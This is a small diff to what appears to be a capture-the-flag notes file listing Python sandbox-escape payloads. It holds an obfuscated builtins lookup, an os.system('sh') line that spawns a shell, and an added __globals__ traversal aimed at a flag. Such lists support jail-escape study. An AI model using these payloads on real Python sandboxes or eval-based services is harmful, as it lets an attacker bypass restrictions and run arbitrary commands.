@@ -15,7 +15,9 @@
 
 6. vars(vars()['__buil'+chr(116)+'ins__'])['prin'+chr(116)](_)
 
-7. __import__("os").system("sh") 
+7. __import__("os").system("sh")
+
+8. __class__.__init__.__globals__.__getitem__ FLAG
 ```
 
 
